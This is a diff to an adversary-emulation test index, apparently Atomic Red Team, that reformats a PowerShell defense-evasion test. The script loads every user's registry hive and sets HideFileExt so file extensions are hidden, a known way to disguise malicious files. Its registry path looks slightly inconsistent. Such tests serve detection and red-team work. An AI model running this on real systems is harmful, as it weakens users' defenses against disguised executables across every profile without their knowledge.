@@ -7673,36 +7673,59 @@ defense-evasion:
       - windows
       executor:
         name: powershell
-        command: "# here is an example of using the same method of reg load, but without
-          the New-PSDrive cmdlet.\n# Here we can load all unloaded user hives and
-          do whatever we want in the location below (comments)\n$PatternSID = 'S-1-5-21-\\d+-\\d+\\-\\d+\\-\\d+$'\n\nWrite-Verbose
-          -Message 'Gathering Profile List and loading their registry hives'\n# Get
-          Username, SID, and location of ntuser.dat for all users\n\n$ProfileList
-          = @()\n$ProfileList = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows
-          NT\\CurrentVersion\\ProfileList\\*' | Where-Object { $_.PSChildName -match
-          $PatternSID } |\n  Select  @{ name = \"SID\"; expression = { $_.PSChildName
-          } },\n          @{ name = \"UserHive\"; expression = { \"$($_.ProfileImagePath)\\ntuser.dat\"
-          } },\n          @{ name = \"Username\"; expression = { $_.ProfileImagePath
-          -replace '^(.*[\\\\\\/])', '' } }\n  \n# Get all user SIDs found in HKEY_USERS
-          (ntuder.dat files that are loaded)\n$LoadedHives = Get-ChildItem Registry::HKEY_USERS
-          | ? { $_.PSChildname -match $PatternSID } | Select @{ name = \"SID\"; expression
-          = { $_.PSChildName } }\n      \n$SIDObject = @()\n  \nforeach ($item in
-          $LoadedHives)\n{\n    $props = @{\n        SID = $item.SID\n    }\n\n    $TempSIDObject
-          = New-Object -TypeName PSCustomObject -Property $props\n    $SIDObject +=
-          $TempSIDObject\n}\n\n# We need to use ($ProfileList | Measure-Object).count
-          instead of just ($ProfileList).count because in PS V2\n# if the count is
-          less than 2 it doesn't work. :)\nfor ($p = 0; $p -lt ($ProfileList | Measure-Object).count;
-          $p++)\n{\n    for ($l = 0; $l -lt ($SIDObject | Measure-Object).count; $l++)\n
-          \   {\n        if (($ProfileList[$p].SID) -ne ($SIDObject[$l].SID))\n        {\n
-          \           $UnloadedHives += $ProfileList[$p].SID\n            Write-Verbose
-          -Message \"Loading Registry hives for $($ProfileList[$p].SID)\"\n            reg
-          load \"HKU\\$($ProfileList[$p].SID)\" \"$($ProfileList[$p].UserHive)\"\n\n
-          \           Write-Verbose -Message 'Attempting to modify registry keys for
-          each profile'\n            #####################################################################\n
-          \           reg add \"HKEY_CURRENT_USER\\$($ProfileList[$p].SID)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\"
-          /t REG_DWORD /v HideFileExt /d 1 /f\n    }\n}\n\nWrite-Verbose 'Unloading
-          Registry hives for all users'\n# Unload ntuser.dat        \n### Garbage
-          collection and closing of ntuser.dat ###\n[gc]::Collect()\nreg unload \"HKU\\$($ProfileList[$p].SID)\""
+        command: |
+          # here is an example of using the same method of reg load, but without the New-PSDrive cmdlet.
+          # Here we can load all unloaded user hives and do whatever we want in the location below (comments)
+          $PatternSID = 'S-1-5-21-\d+-\d+\-\d+\-\d+$'
+
+          Write-Verbose -Message 'Gathering Profile List and loading their registry hives'
+          # Get Username, SID, and location of ntuser.dat for all users
+
+          $ProfileList = @()
+          $ProfileList = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' | Where-Object { $_.PSChildName -match $PatternSID } |
+            Select  @{ name = "SID"; expression = { $_.PSChildName } },
+                    @{ name = "UserHive"; expression = { "$($_.ProfileImagePath)\ntuser.dat" } },
+                    @{ name = "Username"; expression = { $_.ProfileImagePath -replace '^(.*[\\\/])', '' } }
+
+          # Get all user SIDs found in HKEY_USERS (ntuder.dat files that are loaded)
+          $LoadedHives = Get-ChildItem Registry::HKEY_USERS | ? { $_.PSChildname -match $PatternSID } | Select @{ name = "SID"; expression = { $_.PSChildName } }
+
+          $SIDObject = @()
+
+          foreach ($item in $LoadedHives)
+          {
+              $props = @{
+                  SID = $item.SID
+              }
+
+              $TempSIDObject = New-Object -TypeName PSCustomObject -Property $props
+              $SIDObject += $TempSIDObject
+          }
+
+          # We need to use ($ProfileList | Measure-Object).count instead of just ($ProfileList).count because in PS V2
+          # if the count is less than 2 it doesn't work. :)
+          for ($p = 0; $p -lt ($ProfileList | Measure-Object).count; $p++)
+          {
+              for ($l = 0; $l -lt ($SIDObject | Measure-Object).count; $l++)
+              {
+                  if (($ProfileList[$p].SID) -ne ($SIDObject[$l].SID))
+                  {
+                      $UnloadedHives += $ProfileList[$p].SID
+                      Write-Verbose -Message "Loading Registry hives for $($ProfileList[$p].SID)"
+                      reg load "HKU\$($ProfileList[$p].SID)" "$($ProfileList[$p].UserHive)"
+
+                      Write-Verbose -Message 'Attempting to modify registry keys for each profile'
+                      #####################################################################
+                      reg add "HKEY_CURRENT_USER\$($ProfileList[$p].SID)\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /t REG_DWORD /v HideFileExt /d 1 /f
+                  }
+              }
+          }
+
+          Write-Verbose 'Unloading Registry hives for all users'
+          # Unload ntuser.dat
+          ### Garbage collection and closing of ntuser.dat ###
+          [gc]::Collect()
+          reg unload "HKU\$($ProfileList[$p].SID)"
   T1170:
     technique:
       external_references:
